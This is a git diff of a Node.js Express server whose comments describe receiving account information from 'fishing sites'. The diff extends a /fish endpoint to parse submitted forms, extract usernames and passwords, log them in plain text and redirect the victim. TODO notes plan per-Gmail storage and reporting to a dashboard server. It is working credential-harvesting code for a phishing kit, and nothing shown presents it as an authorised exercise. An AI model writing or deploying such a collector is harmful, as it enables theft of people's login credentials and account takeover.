@@ -1,18 +1,29 @@
 const express = require('express');
 const path = require('path');
+const bodyParser = require('body-parser')
+
+const jsonParser = bodyParser.json()
+const urlencodedParser = bodyParser.urlencoded({ extended: false })
 const app = express();
 const port = 5001
 
 app.use(express.static(path.join(__dirname, '../frontend')));
 
 // Receive the account information from fishing sites.
-app.post('/fish', function(request, response){
+app.post('/fish', urlencodedParser, function(request, response){
     // TODO: Get account information and store into the coressponding json file according to gmail account.
     const host = request.headers.host
     console.log(host)
     console.log(request.url);
-    console.log(request.body);
+
+    const username = request.body.username;
+    const password = request.body.password;
+    console.log(`username: ${username}`);
+    console.log(`password: ${password}`);
+
+    // TODO: Request dashboard server to update fish information.
     
+
     // Redirect to introduction page.
     response.redirect('introduction')
 });
